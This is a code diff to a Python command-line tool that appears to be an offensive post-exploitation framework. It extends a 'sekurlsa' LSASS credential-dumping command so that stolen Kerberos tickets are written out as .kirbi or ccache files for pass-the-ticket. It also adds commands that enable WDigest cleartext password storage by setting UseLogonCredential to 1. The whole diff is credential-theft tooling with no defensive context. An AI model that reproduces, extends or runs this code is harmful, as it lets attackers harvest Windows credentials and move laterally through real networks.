@@ -429,7 +429,9 @@ def _cmd_sekurlsa(srv, args):
             return 1
     pkgs = args.pkgs or "all"
     ok, report = _lsass_mod.sekurlsa_logonpasswords(
-        packages=pkgs, pid=pid, no_lsa=args.no_lsa)
+        packages=pkgs, pid=pid, no_lsa=args.no_lsa,
+        export_dir=getattr(args, "export_dir", None),
+        export_ccache=getattr(args, "export_ccache", None))
     if ok:
         _out({
             "ok": True,
@@ -441,6 +443,22 @@ def _cmd_sekurlsa(srv, args):
     # Failure: surface the error string in the envelope too.
     _out({"ok": False, "error": report, "report": ""})
     return 1
+
+
+def _cmd_wdigest_enable(srv, args):
+    """Operator-side: toggle WDigest UseLogonCredential on the local host."""
+    from ..modules import lsass as _lsass_mod
+    ok, msg = _lsass_mod.enable_wdigest(disable=args.disable)
+    _out({"ok": bool(ok), "disable": bool(args.disable), "message": msg})
+    return 0 if ok else 1
+
+
+def _cmd_wdigest_status(srv, args):
+    """Operator-side: read the local WDigest UseLogonCredential setting."""
+    from ..modules import lsass as _lsass_mod
+    ok, msg = _lsass_mod.wdigest_status()
+    _out({"ok": bool(ok), "message": msg})
+    return 0 if ok else 1
 
 
 def run(argv):
@@ -460,6 +478,8 @@ def run(argv):
         "rsh-shell": _cmd_rsh_shell,
         "parse-lsass": _cmd_parse_lsass,
         "sekurlsa": _cmd_sekurlsa,
+        "wdigest-enable": _cmd_wdigest_enable,
+        "wdigest-status": _cmd_wdigest_status,
     }
     if not args.cmd:
         p.print_help()
@@ -544,6 +564,20 @@ def build_parser():
                            "(msv,wdigest,kerberos,tspkg,ssp,livessp,dpapi,cloudap)")
     psek.add_argument("--no-lsa", action="store_true",
                       help="skip LSA decryptor (faster, no cleartext)")
+    psek.add_argument("--export-dir", default=None,
+                      help="write recovered Kerberos tickets as .kirbi files "
+                           "into this directory (pass-the-ticket)")
+    psek.add_argument("--export-ccache", default=None,
+                      help="write all recovered tickets into one MIT ccache file")
+
+    # WDigest cleartext toggle (operator side, local host; Win + admin).
+    pwd_e = sub.add_parser("wdigest-enable",
+                           help="enable WDigest cleartext storage "
+                                "(UseLogonCredential=1)")
+    pwd_e.add_argument("--disable", action="store_true",
+                       help="disable instead (UseLogonCredential=0)")
+    sub.add_parser("wdigest-status",
+                   help="show the current WDigest UseLogonCredential setting")
 
     return p
 
